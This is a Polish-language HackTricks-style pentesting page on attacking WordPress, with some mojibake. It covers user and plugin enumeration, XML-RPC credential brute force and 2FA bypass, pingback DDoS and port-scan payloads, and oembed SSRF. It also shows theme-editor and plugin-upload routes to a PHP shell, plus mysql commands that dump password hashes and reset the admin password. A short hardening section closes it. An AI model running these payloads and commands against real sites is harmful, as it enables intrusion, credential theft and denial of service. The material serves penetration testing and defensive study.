# Wordpress

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Podstawowe informacje

**PrzesÅ‚ane** pliki trafiajÄ… pod adres: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**Pliki motywÃ³w moÅ¼na znaleÅºÄ‡ w /wp-content/themes/,** wiÄ™c jeÅ›li zmienisz niektÃ³re php motywu, aby uzyskaÄ‡ RCE, prawdopodobnie bÄ™dziesz uÅ¼ywaÄ‡ tej Å›cieÅ¼ki. Na przykÅ‚ad: KorzystajÄ…c z **motywu twentytwelve** moÅ¼esz **uzyskaÄ‡ dostÄ™p** do pliku **404.php** pod adresem: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**Inny przydatny adres URL to:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

W pliku **wp-config.php** moÅ¼na znaleÅºÄ‡ hasÅ‚o gÅ‚Ã³wne bazy danych.

DomyÅ›lne Å›cieÅ¼ki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **GÅ‚Ã³wne pliki WordPressa**

* `index.php`
* `license.txt` zawiera przydatne informacje, takie jak zainstalowana wersja WordPressa.
* `wp-activate.php` jest uÅ¼ywany w procesie aktywacji e-mailowej podczas konfigurowania nowej witryny WordPress.
* Foldery logowania (mogÄ… byÄ‡ zmieniane nazwy, aby je ukryÄ‡):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` to plik reprezentujÄ…cy funkcjÄ™ WordPressa, ktÃ³ra umoÅ¼liwia przesyÅ‚anie danych za pomocÄ… protokoÅ‚u HTTP jako mechanizmu transportu i XML jako mechanizmu kodowania. Ten rodzaj komunikacji zostaÅ‚ zastÄ…piony przez [REST API](https://developer.wordpress.org/rest-api/reference) WordPressa.
* Folder `wp-content` to gÅ‚Ã³wny katalog, w ktÃ³rym przechowywane sÄ… wtyczki i motywy.
* `wp-content/uploads/` to katalog, w ktÃ³rym przechowywane sÄ… wszystkie przesÅ‚ane pliki na platformÄ™.
* `wp-includes/` to katalog, w ktÃ³rym przechowywane sÄ… pliki gÅ‚Ã³wne, takie jak certyfikaty, czcionki, pliki JavaScript i widÅ¼ety.
* `wp-sitemap.xml` W wersjach WordPressa 5.5 i nowszych, WordPress generuje plik sitemap XML zawierajÄ…cy wszystkie publiczne posty oraz publicznie wyszukiwalne typy postÃ³w i taksonomie.

**Eksploatacja po uzyskaniu dostÄ™pu**

W pliku `wp-config.php` znajdujÄ… siÄ™ informacje wymagane przez WordPressa do poÅ‚Ä…czenia z bazÄ… danych, takie jak nazwa bazy danych, host bazy danych, nazwa uÅ¼ytkownika i hasÅ‚o, klucze uwierzytelniania i soli oraz prefiks tabeli bazy danych. Ten plik konfiguracyjny moÅ¼e rÃ³wnieÅ¼ byÄ‡ uÅ¼ywany do aktywacji trybu DEBUG, ktÃ³ry moÅ¼e byÄ‡ przydatny podczas rozwiÄ…zywania problemÃ³w.

### Uprawnienia uÅ¼ytkownikÃ³w

* **Administrator**
* **Redaktor**: Publikuje i zarzÄ…dza swoimi i innymi wpisami
* **Autor**: Publikuje i zarzÄ…dza swoimi wpisami
* **WspÃ³Å‚autor**: Pisze i zarzÄ…dza swoimi wpisami, ale nie moÅ¼e ich publikowaÄ‡
* **Subskrybent**: PrzeglÄ…da wpisy i edytuje swÃ³j profil

## **Pasywne wyliczanie**

### **SprawdÅº wersjÄ™ WordPressa**

SprawdÅº, czy moÅ¼na znaleÅºÄ‡ pliki `/license.txt` lub `/readme.html`

W **kodzie ÅºrÃ³dÅ‚owym** strony (przykÅ‚ad z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (343).png>)

* Pliki linkujÄ…ce CSS

![](<../../.gitbook/assets/image (344).png>)

* Pliki JavaScript

![](<../../.gitbook/assets/image (346).png>)

### Pobierz wtyczki

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endcode %}

### Pobierz motywy

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endcode %}

### WyodrÄ™bnianie wersji ogÃ³lnie

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Aktywne wyliczanie

### Wtyczki i motywy

Prawdopodobnie nie bÄ™dziesz w stanie znaleÅºÄ‡ wszystkich moÅ¼liwych wtyczek i motywÃ³w. Aby je wszystkie odkryÄ‡, bÄ™dziesz musiaÅ‚ **aktywnie Brute Force listÄ™ wtyczek i motywÃ³w** (na szczÄ™Å›cie dla nas istniejÄ… narzÄ™dzia automatyzujÄ…ce, ktÃ³re zawierajÄ… te listy).

### UÅ¼ytkownicy

**Brute Force ID**

MoÅ¼esz uzyskaÄ‡ waÅ¼nych uÅ¼ytkownikÃ³w witryny WordPress, uÅ¼ywajÄ…c Brute Force do odgadywania identyfikatorÃ³w uÅ¼ytkownikÃ³w:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi to **200** lub **30X**, oznacza to, Å¼e identyfikator jest **poprawny**. JeÅ›li odpowiedÅº to **400**, to identyfikator jest **nieprawidÅ‚owy**.

**wp-json**

MoÅ¼esz rÃ³wnieÅ¼ sprÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach, wysyÅ‚ajÄ…c zapytanie:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
Kolejnym punktem koÅ„cowym `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach, jest:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZauwaÅ¼, Å¼e ten punkt koÅ„cowy ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali post. **Dostarczane bÄ™dÄ… tylko informacje o uÅ¼ytkownikach, ktÃ³rzy majÄ… tÄ™ funkcjÄ™ wÅ‚Ä…czonÄ…**.

NaleÅ¼y rÃ³wnieÅ¼ zauwaÅ¼yÄ‡, Å¼e **/wp-json/wp/v2/pages** moÅ¼e ujawniaÄ‡ adresy IP.

#### Wyliczanie nazw uÅ¼ytkownikÃ³w do logowania

Podczas logowania na stronie **`/wp-login.php`** wiadomoÅ›Ä‡ jest **inna**, jeÅ›li podana nazwa uÅ¼ytkownika istnieje lub nie.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywny, moÅ¼na przeprowadziÄ‡ atak siÅ‚owy na poÅ›wiadczenia lub uÅ¼yÄ‡ go do przeprowadzenia atakÃ³w DoS na inne zasoby. (MoÅ¼na to zautomatyzowaÄ‡[ uÅ¼ywajÄ…c tego](https://github.com/relarizky/wpxploit) na przykÅ‚ad).

Aby sprawdziÄ‡, czy jest aktywny, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wyÅ›lij to Å¼Ä…danie:

**SprawdÅº**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Brute Force dla poÅ›wiadczeÅ„**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** to niektÃ³re z metod, ktÃ³re moÅ¼na wykorzystaÄ‡ do przeprowadzenia ataku brute-force na poÅ›wiadczenia. JeÅ›li uda ci siÄ™ znaleÅºÄ‡ ktÃ³rÄ…Å› z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› takiego:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
WiadomoÅ›Ä‡ _"NieprawidÅ‚owa nazwa uÅ¼ytkownika lub hasÅ‚o"_ powinna pojawiÄ‡ siÄ™ w odpowiedzi o kodzie 200, jeÅ›li dane uwierzytelniajÄ…ce sÄ… nieprawidÅ‚owe.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (4).png>)

![](<../../.gitbook/assets/image (102).png>)

UÅ¼ywajÄ…c poprawnych danych uwierzytelniajÄ…cych, moÅ¼na przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
RÃ³wnieÅ¼ istnieje **szybszy sposÃ³b** na prÃ³bÄ™ zÅ‚amania danych uwierzytelniajÄ…cych za pomocÄ… **`system.multicall`**, poniewaÅ¼ moÅ¼na wyprÃ³bowaÄ‡ kilka danych uwierzytelniajÄ…cych w jednym Å¼Ä…daniu:

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

**OminiÄ™cie 2FA**

Ta metoda jest przeznaczona dla programÃ³w, a nie dla ludzi, i jest przestarzaÅ‚a, dlatego nie obsÅ‚uguje 2FA. JeÅ›li masz poprawne dane uwierzytelniajÄ…ce, ale gÅ‚Ã³wne wejÅ›cie jest chronione przez 2FA, **moÅ¼esz prÃ³bowaÄ‡ wykorzystaÄ‡ xmlrpc.php do zalogowania siÄ™ tymi danymi, omijajÄ…c 2FA**. NaleÅ¼y jednak zauwaÅ¼yÄ‡, Å¼e nie bÄ™dziesz mÃ³gÅ‚ wykonywaÄ‡ wszystkich czynnoÅ›ci, ktÃ³re moÅ¼na wykonaÄ‡ za pomocÄ… konsoli, ale wciÄ…Å¼ moÅ¼esz uzyskaÄ‡ RCE, jak to wyjaÅ›nia Ippsec w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

**DDoS lub skanowanie portÃ³w**

JeÅ›li znajdziesz metodÄ™ _**pingback.ping**_ na liÅ›cie, moÅ¼esz sprawiÄ‡, Å¼e Wordpress wyÅ›le dowolne Å¼Ä…danie do dowolnego hosta/portu.\
MoÅ¼na to wykorzystaÄ‡, aby poprosiÄ‡ **tysiÄ…ce** witryn **Wordpress** o **dostÄ™p** do jednego **miejsca** (co spowoduje DDoS w tym miejscu), lub moÅ¼na go uÅ¼yÄ‡ do **skanowania** wewnÄ™trznej **sieci** Wordpress (moÅ¼na wskazaÄ‡ dowolny port).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

JeÅ›li otrzymasz **faultCode** o wartoÅ›ci **wiÄ™kszej** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

Przejrzyj uÅ¼ycie metody **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak naduÅ¼yÄ‡ tej metody w celu spowodowania ataku DDoS.

**Atak DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (103).png>)

### wp-cron.php DoS

Ten plik zazwyczaj znajduje siÄ™ w gÅ‚Ã³wnym katalogu witryny Wordpress: **`/wp-cron.php`**\
Gdy ten plik jest **odwoÅ‚ywany**, wykonywane jest "**ciÄ™Å¼kie**" zapytanie MySQL, dlatego moÅ¼e byÄ‡ wykorzystywany przez **atakujÄ…cych** do **spowodowania** ataku typu DoS.\
Dodatkowo, domyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym Å‚adowaniu strony (za kaÅ¼dym razem, gdy klient Å¼Ä…da dowolnej strony Wordpress), co na witrynach o duÅ¼ej liczbie odwiedzin moÅ¼e powodowaÄ‡ problemy (DoS).

Zaleca siÄ™ wyÅ‚Ä…czenie Wp-Cron i utworzenie prawdziwego zadania cron wewnÄ…trz hosta, ktÃ³re wykonuje wymagane czynnoÅ›ci w regularnych odstÄ™pach czasu (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i witryna Wordpress moÅ¼e wysÅ‚aÄ‡ do Ciebie Å¼Ä…danie.

Oto odpowiedÅº, gdy to nie dziaÅ‚a:

![](<../../.gitbook/assets/image (184) (1).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

To narzÄ™dzie sprawdza, czy istnieje **methodName: pingback.ping** i Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy**, a jeÅ›li tak, prÃ³buje je wykorzystaÄ‡.

### NarzÄ™dzia automatyczne
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ zadania** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ci.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Uzyskaj dostÄ™p przez nadpisanie jednego bitu

To bardziej ciekawostka niÅ¼ rzeczywisty atak. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼na byÅ‚o zmieniÄ‡ 1 bit w dowolnym pliku WordPressa. MoÅ¼na byÅ‚o zmieniÄ‡ pozycjÄ™ `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zablokowaÄ‡ operacjÄ™ NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikowanie pliku php z wykorzystaniem uÅ¼ywanego motywu (wymagane poÅ›wiadczenia administratora)**

WyglÄ…d â†’ Edytor motywÃ³w â†’ Szablon 404 (po prawej stronie)

ZmieÅ„ zawartoÅ›Ä‡ na php shell:

![](<../../.gitbook/assets/image (21) (1) (1).png>)

Wyszukaj w internecie, jak moÅ¼na uzyskaÄ‡ dostÄ™p do zaktualizowanej strony. W tym przypadku musisz uzyskaÄ‡ dostÄ™p tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
## Plugin RCE

### PHP plugin

MoÅ¼liwe jest przesÅ‚anie plikÃ³w .php jako wtyczki.\
StwÃ³rz swoje php backdoor uÅ¼ywajÄ…c na przykÅ‚ad:

![](<../../.gitbook/assets/image (407).png>)

NastÄ™pnie dodaj nowÄ… wtyczkÄ™:

![](<../../.gitbook/assets/image (409).png>)

PrzeÅ›lij wtyczkÄ™ i kliknij Zainstaluj teraz:

![](<../../.gitbook/assets/image (411).png>)

Kliknij PrzejdÅº dalej:

![](<../../.gitbook/assets/image (412).png>)

Prawdopodobnie na pierwszy rzut oka nic siÄ™ nie wydarzy, ale jeÅ›li przejdziesz do Media, zobaczysz przesÅ‚ane przez siebie polecenie:

![](<../../.gitbook/assets/image (413).png>)

OtwÃ³rz je i zobaczysz URL do wykonania odwrÃ³conego powÅ‚oki:

![](<../../.gitbook/assets/image (414).png>)

### PrzesyÅ‚anie i aktywowanie zÅ‚oÅ›liwej wtyczki

Ta metoda polega na zainstalowaniu zÅ‚oÅ›liwej wtyczki, ktÃ³ra jest podatna na ataki i moÅ¼e byÄ‡ wykorzystana do uzyskania powÅ‚oki sieciowej. Proces ten jest przeprowadzany za pomocÄ… pulpitu WordPress, zgodnie z poniÅ¼szymi krokami:

1. **Pobieranie wtyczki**: Wtyczka jest pobierana z takiego ÅºrÃ³dÅ‚a jak Exploit DB, na przykÅ‚ad [**tutaj**](https://www.exploit-db.com/exploits/36374).

2. **Instalacja wtyczki**:
- PrzejdÅº do pulpitu WordPress, a nastÄ™pnie przejdÅº do `Pulpit > Wtyczki > PrzeÅ›lij wtyczkÄ™`.
- PrzeÅ›lij plik zip pobranej wtyczki.

3. **Aktywacja wtyczki**: Po pomyÅ›lnej instalacji wtyczki, naleÅ¼y jÄ… aktywowaÄ‡ za pomocÄ… pulpitu.

4. **Wykorzystanie**:
- Po zainstalowaniu i aktywowaniu wtyczki "reflex-gallery", moÅ¼na jÄ… wykorzystaÄ‡, poniewaÅ¼ jest znana z podatnoÅ›ci.
- Framework Metasploit udostÄ™pnia exploit dla tej podatnoÅ›ci. Poprzez zaÅ‚adowanie odpowiedniego moduÅ‚u i wykonanie okreÅ›lonych poleceÅ„, moÅ¼na nawiÄ…zaÄ‡ sesjÄ™ meterpreter, umoÅ¼liwiajÄ…c nieautoryzowany dostÄ™p do witryny.
- NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e jest to tylko jedna z wielu metod wykorzystania witryny WordPress.

ZawartoÅ›Ä‡ obejmuje pomoc wizualnÄ… przedstawiajÄ…cÄ… kroki w pulpicie WordPress dotyczÄ…ce instalacji i aktywacji wtyczki. WaÅ¼ne jest jednak zauwaÅ¼enie, Å¼e wykorzystywanie podatnoÅ›ci w ten sposÃ³b jest nielegalne i niemoralne bez odpowiedniej autoryzacji. Te informacje powinny byÄ‡ uÅ¼ywane odpowiedzialnie i tylko w kontekÅ›cie legalnym, takim jak testowanie penetracyjne za wyraÅºnym zezwoleniem.


**Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe kroki, sprawdÅº: [https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)**


## Post Exploitation

WyodrÄ™bnij nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ hasÅ‚o administratora:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Ochrona WordPressa

### Regularne aktualizacje

Upewnij siÄ™, Å¼e WordPress, wtyczki i motywy sÄ… zaktualizowane. PotwierdÅº rÃ³wnieÅ¼, czy automatyczne aktualizacje sÄ… wÅ‚Ä…czone w pliku wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Dodatkowo, **zainstaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki zabezpieczajÄ…ce

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

* UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
* UÅ¼ywaj **mocnych haseÅ‚** i **2FA**
* Okresowo **sprawdzaj** uprawnienia uÅ¼ytkownikÃ³w
* **Ogranicz liczbÄ™ prÃ³b logowania** w celu zapobiegania atakom Brute Force
* ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwalaj na dostÄ™p tylko wewnÄ™trznie lub z okreÅ›lonych adresÃ³w IP.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ zadania** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
ZdobÄ…dÅº dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
